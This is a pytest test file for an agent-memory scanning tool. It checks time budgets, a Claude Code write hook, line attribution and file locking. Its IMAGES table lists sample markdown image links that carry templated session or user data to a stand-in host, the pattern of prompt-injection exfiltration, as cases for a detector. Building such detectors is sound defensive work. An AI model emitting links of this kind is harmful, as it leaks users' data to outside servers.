"""One hook call does a bounded amount of work, whatever text it is given."""

import json
import os
import time

import pytest

from agentdetox import budget, hidden, integrity, library
from agentdetox.agentscan import scan_text
from agentdetox.hooks import handle
from agentdetox.provenance import attribute_lines
from bench import rule_cost


def test_no_rule_costs_more_than_its_input(monkeypatch):
    monkeypatch.setattr(budget, "SECONDS", 3600.0)
    found = rule_cost.superlinear(rule_cost.FRAGMENTS, kinds=("memory", "shell"))
    assert not found, [(fragment, kind, f"{small:.2f}s -> {large:.2f}s") for large, small, kind, fragment in found]


@pytest.mark.parametrize("text", ["# notes\n" + "\n" * 40000 + "end\n", "<![" * 100000, "![" * 150000,
                                  "](https://a" * 30000, "![a](https://a?{" * 20000])
def test_text_that_used_to_take_minutes_is_checked_quickly(text):
    started = time.monotonic()
    scan_text("x", "x", text, "memory")
    assert time.monotonic() - started < 5


IMAGES = [
    ("![x](https://e.example/a?d={data})", True),
    ("![x](https://e.example/a?d=${D})", True),
    ("![x](https://e.example/a?q=[USER_DATA])", True),
    ("![x](https://e.example/a?q=<session_id>)", True),
    ("![a [b] c](https://e.example/?d={x})", True),
    ("![" + "a" * 5000 + "](https://e.example/?d={x}&p=" + "A" * 9000 + ")", True),
    ("text ![a\nb](https://e.example/?x={y}) more", True),
    ("![x](https://e.example/a?b#c?d={x})", True),
    ("![x](https://e.example/a.png)", False),
    ("![x](https://e.example/a#f?d)", False),
    ("![x](https://e.example/a#{x}?d)", False),
    ("[x](https://e.example/a?d={data})", False),
    ("![img](a.png) see [link](https://e.example/?q={id})", False),
    ("![x](https://e.example/a?d={data} )", False),
    ("![x](ftp://e.example/?d={x})", False),
    ("![x] (https://e.example/?d={x})", False),
]


@pytest.mark.parametrize("text, flagged", IMAGES)
def test_templated_image_address(text, flagged):
    assert bool(hidden._templated_image_urls(text)) is flagged
    assert any(f.detector == "exfil-link" for f in scan_text("x", "x", text, "memory")) is flagged


def test_checking_stops_between_rules_once_over_budget(monkeypatch):
    with budget.limit(0):
        with pytest.raises(budget.OverBudget):
            scan_text("x", "x", "Use pnpm.\n", "memory")
    assert scan_text("x", "x", "Use pnpm.\n", "memory") == []
    with budget.limit(60):
        with budget.limit(0):       # an inner limit can only be shorter
            with pytest.raises(budget.OverBudget):
                budget.check()
        budget.check()


def test_write_that_could_not_be_checked_in_time_asks(tmp_path, monkeypatch):
    project = tmp_path / "proj"
    project.mkdir()
    (project / "CLAUDE.md").write_text("# Project\n", encoding="utf-8")
    monkeypatch.setattr(budget, "SECONDS", 0.0)

    def decide(name):
        _, out = handle("claude-code", {"hook_event_name": "PreToolUse", "cwd": str(project), "tool_name": "Write",
                                        "tool_input": {"file_path": str(project / name), "content": "Use npm.\n"}})
        return json.loads(out)["hookSpecificOutput"] if out else None

    reply = decide("CLAUDE.md")
    assert reply["permissionDecision"] == "ask" and "OverBudget" in reply["permissionDecisionReason"]
    assert decide("README.md") is None


def test_library_file_that_takes_too_long_is_not_inspected(monkeypatch):
    monkeypatch.setattr(budget, "SECONDS", 0.0)
    result = library.judge("note.md", b"Use pnpm.\n")
    assert (result.state, result.reason) == ("uninspected", "too-slow")
    assert "too-slow" in library._REASONS


def test_one_edited_line_in_a_long_file_is_attributed_quickly():
    old = "\n".join(f"line {i % 50}" for i in range(20000))
    new = old.replace("line 7\nline 8", "line 7\nNEW\nline 8", 1)
    started = time.monotonic()
    spans = attribute_lines(old, new, None)
    assert time.monotonic() - started < 1
    assert [s["line"] for s in spans] == [9]


@pytest.mark.parametrize("old, new, lines", [
    ("a\nb\nc", "a\nb\nc", []),
    ("", "a\nb", [1, 2]),
    ("a\nb", "", []),
    ("a\nb\nc", "a\nX\nc", [2]),
    ("a\nb\nc", "a\nb\nc\nd", [4]),
    ("a\nb\nc", "z\na\nb\nc", [1]),
    ("a\nb\nc\nd", "a\nc\nd\nb", [4]),
    ("x\nx\nx", "x\nx\nx\nx", [4]),
])
def test_added_lines(old, new, lines):
    assert [s["line"] for s in attribute_lines(old, new, None)] == lines


@pytest.mark.skipif(os.name != "posix", reason="holds the lock through a second descriptor")
def test_a_second_wait_for_a_held_lock_is_short(monkeypatch):
    monkeypatch.setattr(integrity, "LOCK_TIMEOUT", 0.6)
    monkeypatch.setattr(integrity, "LOCK_RETRY", 0.05)
    monkeypatch.setattr(integrity, "_lock_refused", False)
    held = os.open(integrity.private_dir(integrity.store_dir()) / "store.lock", os.O_RDWR | os.O_CREAT, 0o600)
    assert integrity.try_lock(held)

    def wait():
        started = time.monotonic()
        with pytest.raises(integrity.StoreLocked):
            with integrity.store_lock():
                pass
        return time.monotonic() - started

    try:
        assert wait() >= 0.6
        assert wait() < 0.4
        assert wait() < 0.4
    finally:
        integrity.release(held)
    with integrity.store_lock():
        pass
    assert integrity._lock_refused is False     # a wait that succeeds restores the full time
